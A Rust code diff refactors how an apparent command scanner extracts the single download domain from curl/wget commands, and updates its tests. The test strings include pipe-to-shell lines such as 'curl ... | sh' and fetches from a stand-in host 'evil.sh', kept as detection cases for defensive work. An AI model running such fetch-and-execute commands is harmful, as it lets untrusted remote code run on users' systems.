@@ -5,8 +5,10 @@
 use regex::Regex;
 use std::sync::LazyLock;
 
-use super::parse::{self, Segment};
-use super::{FETCHERS, MAX_DEPTH, SHELLS, domains, nested_texts};
+use super::analysis;
+use super::domains;
+use super::parse::Simple;
+use super::readers::FETCHERS;
 use crate::finding::Finding;
 
 /// Rules whose finding is about the download itself. Others (a base64 pipe, a quarantine
@@ -34,32 +36,22 @@ fn fetch_domain(command: &str) -> Option<String> {
     if FETCH_WORD.find_iter(command).count() != 1 {
         return None;
     }
-    let mut fetches = Vec::new();
-    collect_fetches(command, 0, &mut fetches);
-    let [seg] = fetches.as_slice() else {
+    let flat = analysis::flatten(command);
+    if !flat.limits.is_empty() {
+        return None;
+    }
+    let mut fetches = flat
+        .occurrences
+        .iter()
+        .map(|o| &o.simple)
+        .filter(|s| s.program().is_some_and(|p| FETCHERS.contains(&p)));
+    let (Some(fetch), None) = (fetches.next(), fetches.next()) else {
         return None;
     };
-    let urls = positional_args(seg)?;
+    let urls = positional_args(fetch)?;
     match urls.as_slice() {
         [url] => domains::url_host(url),
         _ => None,
-    }
-}
-
-fn collect_fetches(text: &str, depth: usize, out: &mut Vec<Segment>) {
-    if depth >= MAX_DEPTH {
-        return;
-    }
-    for seg in parse::segments(text) {
-        match seg.program() {
-            Some(p) if FETCHERS.contains(&p) => out.push(seg),
-            Some(p) if SHELLS.contains(&p) || p == "eval" => {
-                for (inner, _) in nested_texts(&seg) {
-                    collect_fetches(&inner, depth + 1, out);
-                }
-            }
-            _ => {}
-        }
     }
 }
 
@@ -127,14 +119,14 @@ const WGET: Flags = Flags {
 
 /// The words of a fetch that are addresses, or `None` when any flag is not one known to take
 /// no address (config files, input lists, `--url`, unknown letters all land here).
-fn positional_args(seg: &Segment) -> Option<Vec<&str>> {
+fn positional_args(seg: &Simple) -> Option<Vec<&str>> {
     let flags = if seg.program() == Some("wget") {
         &WGET
     } else {
         &CURL
     };
     let mut positional = Vec::new();
-    let mut args = seg.args().iter().map(String::as_str);
+    let mut args = seg.arg_texts();
     while let Some(arg) = args.next() {
         if arg == "--" || arg.starts_with("---") {
             return None;
@@ -199,6 +191,10 @@ mod tests {
             Some("example.org")
         );
         assert_eq!(
+            domain("echo $(curl https://example.org/a)").as_deref(),
+            Some("example.org")
+        );
+        assert_eq!(
             domain("curl -H 'X: evil.sh' https://example.org/a").as_deref(),
             Some("example.org")
         );
@@ -218,7 +214,6 @@ mod tests {
             "curl --weird https://example.org/a | sh",
             "curl -Z https://example.org/a https://evil.sh/b | sh",
             "curl https://example.org/a && wget https://evil.sh/b",
-            "echo $(curl https://example.org/a)",
             "curl -- https://example.org/a",
             "curl -o",
             "curl -R https://example.org/a | sh",
